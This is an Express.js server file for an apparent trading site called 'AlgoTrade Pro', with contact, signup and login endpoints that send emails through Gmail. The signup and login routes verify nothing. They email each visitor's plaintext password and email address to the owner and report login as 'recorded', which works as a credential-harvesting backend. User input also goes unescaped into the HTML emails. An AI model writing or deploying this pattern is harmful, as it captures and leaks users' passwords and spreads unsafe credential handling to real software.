import express from "express";
import cors from "cors";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Create transporter
const createTransporter = () => {
  return nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });
};

// ---------- CONTACT FORM ----------
app.post('/api/contact', async (req, res) => {
  try {
    const { name, email, company, subject, message, inquiryType } = req.body;

    if (!name || !email || !subject || !message) {
      return res.status(400).json({ success: false, message: 'Please fill in all required fields' });
    }

    const transporter = createTransporter();

    // Email to owner
    const ownerMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.OWNER_EMAIL || process.env.EMAIL_USER,
      subject: `New AlgoTrade Pro Contact: ${subject}`,
      html: `
        <div style="font-family: Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#2563EB,#4F46E5); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">New Trading Inquiry</h2>
          </div>
          <div style="padding:20px; background:#f9f9f9;">
            <h3 style="color:#2563EB;">Contact Details</h3>
            <p><strong>Name:</strong> ${name}</p>
            <p><strong>Email:</strong> ${email}</p>
            ${company ? `<p><strong>Company:</strong> ${company}</p>` : ''}
            <p><strong>Inquiry Type:</strong> ${inquiryType}</p>
            <p><strong>Subject:</strong> ${subject}</p>
            <h4 style="color:#2563EB;">Message:</h4>
            <div style="background:white; padding:15px; border-radius:5px; border-left:4px solid #2563EB;">
              ${message.replace(/\n/g, '<br>')}
            </div>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">This email was sent from AlgoTrade Pro Contact Form</p>
          </div>
        </div>
      `
    };

    // Confirmation to user
    const userMailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: 'Thank you for contacting AlgoTrade Pro',
      html: `
        <div style="font-family: Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#2563EB,#4F46E5); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">We received your message!</h2>
          </div>
          <div style="padding:20px;">
            <p>Dear ${name},</p>
            <p>Thank you for contacting AlgoTrade Pro. Our team will review your inquiry shortly.</p>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">Best regards,<br>The AlgoTrade Pro Team</p>
          </div>
        </div>
      `
    };

    await transporter.sendMail(ownerMailOptions);
    await transporter.sendMail(userMailOptions);

    res.status(200).json({ success: true, message: 'Message sent successfully!' });
  } catch (error) {
    console.error('Contact error:', error);
    res.status(500).json({ success: false, message: 'Failed to send message.' });
  }
});

// ---------- SIGNUP ----------
app.post('/api/signup', async (req, res) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ success: false, message: 'All fields are required' });
    }

    const transporter = createTransporter();

    // Email to owner
    const ownerMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.OWNER_EMAIL || process.env.EMAIL_USER,
      subject: `New Signup - AlgoTrade Pro`,
      html: `
        <div style="font-family:Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#10B981,#059669); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">New User Signup</h2>
          </div>
          <div style="padding:20px;">
            <p><strong>Name:</strong> ${name}</p>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Password:</strong> ${password}</p>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">Signup recorded on ${new Date().toLocaleString()}</p>
          </div>
        </div>
      `
    };

    // Confirmation to user
    const userMailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: 'Welcome to AlgoTrade Pro!',
      html: `
        <div style="font-family:Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#10B981,#059669); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">Welcome, ${name}!</h2>
          </div>
          <div style="padding:20px;">
            <p>Thank you for signing up with AlgoTrade Pro. Our team will be in touch soon.</p>
            <p>Your account has been registered successfully!</p>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">Best regards,<br>The AlgoTrade Pro Team</p>

          </div>
        </div>
      `
    };

    await transporter.sendMail(ownerMailOptions);
    await transporter.sendMail(userMailOptions);

    res.status(200).json({ success: true, message: 'Signup successful! Emails sent.' });
  } catch (error) {
    console.error('Signup error:', error);
    res.status(500).json({ success: false, message: 'Signup failed.' });
  }
});

// ---------- LOGIN ----------
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const transporter = createTransporter();

    // Email to owner
    const ownerMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.OWNER_EMAIL || process.env.EMAIL_USER,
      subject: `Login Attempt - AlgoTrade Pro`,
      html: `
        <div style="font-family:Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#F59E0B,#D97706); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">Login Attempt</h2>
          </div>
          <div style="padding:20px;">
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Password:</strong> ${password}</p>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">Login attempt on ${new Date().toLocaleString()}</p>
          </div>
        </div>
      `
    };

    // Confirmation to user
    const userMailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: 'Login Notification - AlgoTrade Pro',
      html: `
        <div style="font-family:Arial,sans-serif; max-width:600px; margin:auto; border:1px solid #ddd; border-radius:10px;">
          <div style="background:linear-gradient(135deg,#F59E0B,#D97706); color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center;">
            <h2 style="margin:0;">Login Notification</h2>
          </div>
          <div style="padding:20px;">
            <p>Hello,</p>
            <p>We detected a login attempt with your account. If this was you, you can ignore this message. If not, please secure your account immediately.</p>
          </div>
          <div style="background:#f1f5f9; padding:15px; border-radius:0 0 10px 10px; text-align:center; color:#666;">
            <p style="margin:0; font-size:14px;">Stay safe,<br>The AlgoTrade Pro Team</p>
          </div>
        </div>
      `
    };

    await transporter.sendMail(ownerMailOptions);
    await transporter.sendMail(userMailOptions);

    res.status(200).json({ success: true, message: 'Login recorded. Emails sent.' });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, message: 'Login failed.' });
  }
});

// ---------- HEALTH CHECK ----------
app.get('/api/health', (req, res) => {
  res.status(200).json({ status: 'Server running' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
